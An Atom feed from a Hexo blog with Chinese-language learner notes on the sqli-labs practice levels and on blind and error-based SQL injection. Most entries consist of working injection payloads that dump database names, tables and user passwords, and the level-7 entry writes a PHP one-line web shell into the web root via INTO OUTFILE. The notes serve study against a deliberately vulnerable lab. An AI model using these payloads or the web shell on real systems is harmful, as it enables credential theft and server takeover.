<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-07T17:01:59.214Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs_3</title>
    <link href="http://example.com/2022/11/08/sqli-labs_3/"/>
    <id>http://example.com/2022/11/08/sqli-labs_3/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-07T17:01:59.214Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有了过第1，2关的基础，现在再往后看就比较轻松了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1’后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_3.png" alt="报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘’1’’) LIMIT 0,1’ at line 1<br>可知，sql语句是单引号字符型且有括号。<br>所以我们也需要闭合单引号和括号。<br>则构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&#x27;)--+</span><br></pre></td></tr></table></figure></li></ol><p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p><ol start="3"><li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) order by 3--+</span><br></pre></td></tr></table></figure></li><li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li><li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>此笔记为笔者初学sql注入时所写</li><li>本关重点在于通过报错信息判断sql语句</li></ul><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;有了过第1，2关的基础，现在再往后看就比较轻松了。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_5+6</title>
    <link href="http://example.com/2022/11/08/sqli-labs_5+6/"/>
    <id>http://example.com/2022/11/08/sqli-labs_5+6/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-08T15:58:09.060Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure><p>可得字段数为3</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure><p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure><p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p></li></ol><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul><li><p><a href="https://blog.csdn.net/wyzhxhn/article/details/127718995">sqli-labs—–第五关</a></p></li><li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_4</title>
    <link href="http://example.com/2022/11/08/sqli-labs_4/"/>
    <id>http://example.com/2022/11/08/sqli-labs_4/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-07T17:06:47.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li></ol><p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p><ol start="3"><li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li><li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li><li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>此笔记为笔者初学sql注入时所写</li><li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li></ul><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;和第3关其实是同种类型&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs_7</title>
    <link href="http://example.com/2022/11/08/sqli-labs_7/"/>
    <id>http://example.com/2022/11/08/sqli-labs_7/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-08T15:57:43.055Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关耗费了我好几个小时，究其原因，是大多博客写得不清不楚，或者说自认为清楚，读者(我)却感到很迷惑。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’–+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))–+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure><p>可得字段数为3</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p></li></ol><ul><li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li><li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li></ul><p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p><ul><li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li><li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>secure_file_priv 一栏的value为空，即是成功</li></ul><p>之后就能愉快地获取库名和版本号了,示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure><ol start="4"><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li></ol><h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul><li><a href="https://blog.csdn.net/qq_33598708/article/details/124059514">sqli-labs第七关sql注入流程</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关耗费了我好几个小时，究其原因，是大多博客写得不清不楚，或者说自认为清楚，读者(我)却感到很迷惑。&lt;/p&gt;</summary>
    
    
    
    <category term="SQL注入" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/sqli-labs/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>布尔盲注</title>
    <link href="http://example.com/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    <id>http://example.com/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-08T16:59:27.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure><h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure><p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure><h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure><h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure><p>说明：ASCII码表中可显示的字符范围是：0~127</p><h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol><li><p>判断数据库名长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure></li><li><p>猜解数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure></li><li><p>判断数据库表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure></li><li><p>判断数据库字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure></li><li><p>取数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li></ol><p>说明：如果写脚本，采用二分法更佳</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul><li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li><li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;基于布尔的盲注是一种常用的，重要的注入方式。&lt;/p&gt;
&lt;h1 id=&quot;应用场景&quot;&gt;&lt;a href=&quot;#应用场景&quot; class=&quot;header</summary>
      
    
    
    
    <category term="SQL注入，布尔盲注" scheme="http://example.com/categories/SQL%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
    
    
    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>报错注入常用函数</title>
    <link href="http://example.com/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
    <id>http://example.com/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</id>
    <published>2022-11-07T16:00:00.000Z</published>
    <updated>2022-11-08T10:47:05.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>所谓报错注入，就是SQL注入中页面不会返回正常信息，但是会返回报错信息而产生的一种注入方式。而报错注入在使用函数时会很方便，这里就来介绍三种常用报错函数。</p><span id="more"></span><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><ol><li>格式<br>updatexml(XML_document,XPath_string,new_value)</li></ol><ul><li>XML_document: xml标记</li><li>XPath_string: 显示输入语句</li><li>new_value: 新值</li><li>输出字符长度限制为32个字符</li><li>适用版本：5.1.5以上</li></ul><ol start="2"><li>原理<br>updatexml()函数是MySQL对XML文档数据进行查询和修改的XPATH函数：</li></ol><ul><li>xml:可扩展语言</li><li>update():函数更新</li><li>组合，具有查询功能的函数，用于查询xpath<br>利用插入不符合函数格式的语句并拼接查询语句从而通过函数报错达到查询内容的目的</li></ul><ol start="3"><li>示例<br>updatexml(1,concat(0x7e,(select database()),0x7e),1)</li></ol><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><ol><li><p>格式<br>extractvalue(XML_document,XPath_string):<br>XML_document是string格式，为XML文档对象的名称<br>XPath_string(Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串</p></li><li><p>原理</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> extractvalue(<span class="string">&#x27;&lt;a&gt;&lt;b&gt;&lt;b/&gt;&lt;/a&gt;&#x27;</span>, <span class="string">&#x27;/a/b&#x27;</span>)</span><br></pre></td></tr></table></figure><p>该语句是寻找前一段xml文档内容中的a节点下的b节点，这里如果Xpath格式语法书写错误，就会报错</p></li></ol><ul><li>输出字符长度限制为32个字符</li><li>适用版本：5.1.5以上</li></ul><ol start="3"><li>示例<br>extractvalue(1,concat(0x7e,(select database())))</li></ol><h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><ol><li>格式<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(payload,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure></li></ol><ul><li>payload是需要插入sql注入语句的位置</li><li>floor():去除小数部分</li><li>rand():产生随机数</li><li>rand(x):每个x对应一个固定的值，连续执行多次值会变化，但可预测，序列为011011…</li><li>count():count(*)函数返回表中的记录数</li><li>适用版本：5.0 &lt; MySQL &lt; 8.x</li></ul><ol start="2"><li><p>原理<br>利用数据库表主键不能重复的原理，使用group by分组，产生主键key冗余，导致报错<br>详细解释：<a href="https://blog.csdn.net/qq_43504939/article/details/90046342">SQL注入:floor()报错注入</a></p></li><li><p>示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-1/?id=-1’ and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure></li></ol><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul><li><p><a href="https://blog.csdn.net/qq_43238111/article/details/106205125">报错注入常用函数</a></p></li><li><p><a 